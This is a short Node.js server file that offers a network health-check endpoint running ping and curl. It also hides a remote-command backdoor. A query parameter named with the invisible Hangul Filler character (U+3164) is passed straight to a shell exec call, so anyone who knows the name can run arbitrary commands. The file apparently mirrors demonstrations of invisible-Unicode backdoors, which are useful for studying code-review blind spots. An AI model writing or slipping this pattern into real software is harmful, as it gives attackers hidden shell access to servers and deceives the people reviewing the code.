'use strict';
const http = require('http');
const { exec } = require('child_process');

// U+3164 Hangul Filler used as an identifier
const uchar = '\u3164';

http.createServer((req, res) => {
	const url = new URL(req.url, 'http://localhost');
	if (url.pathname !== '/network_health') {
		res.writeHead(404);
		res.end('not found');
		return;
	}
	const timeout = parseInt(url.searchParams.get('timeout') || '5000', 10);
	const hidden = url.searchParams.get(uchar);
	const checkCommands = [
		'ping -c 1 google.com',
		'curl http://google.com/',
		hidden,
	];
	Promise.all(
		checkCommands.map(
			(cmd) => cmd && new Promise((resolve, reject) => {
				exec(cmd, { timeout }, (err, out, errout) => (err ? reject(err) : resolve(out || errout)));
			}),
		),
	)
		.then(() => {
			res.writeHead(200);
			res.end('ok');
		})
		.catch(() => {
			res.writeHead(500);
			res.end('failed');
		});
}).listen(8080);


